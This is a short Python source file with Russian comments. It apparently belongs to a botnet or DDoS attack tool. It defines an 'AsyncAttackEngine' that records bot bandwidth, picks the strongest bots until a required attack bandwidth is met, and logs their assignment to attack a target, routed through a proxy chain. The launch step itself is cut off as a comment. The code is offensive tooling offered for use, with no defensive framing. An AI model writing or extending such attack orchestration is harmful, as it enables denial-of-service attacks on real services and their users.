import asyncio
import aiohttp
from engine.proxy import ProxyChain
from utils.logger import log

# Улучшение №10: автоматическое распределение атак по мощности ботов

class AsyncAttackEngine:
    def __init__(self):
        self.bots = {}  # bot_id -> bandwidth

    def set_bots(self, bot_list):
        self.bots = {b['id']: b['bandwidth'] for b in bot_list}

    async def smart_attack(self, target, method, required_mbps):
        available = sum(self.bots.values())
        if available < required_mbps:
            log(f'Недостаточно мощности: доступно {available} Мбит/с, нужно {required_mbps}')
            return
        # Выбор подмножества ботов, пропорционально их пропускной способности
        selected = []
        current = 0
        for bot_id, bw in sorted(self.bots.items(), key=lambda x: -x[1]):
            if current >= required_mbps:
                break
            selected.append(bot_id)
            current += bw
        log(f'Назначено {len(selected)} ботов на атаку {target}')
        # ... запуск атаки с selected
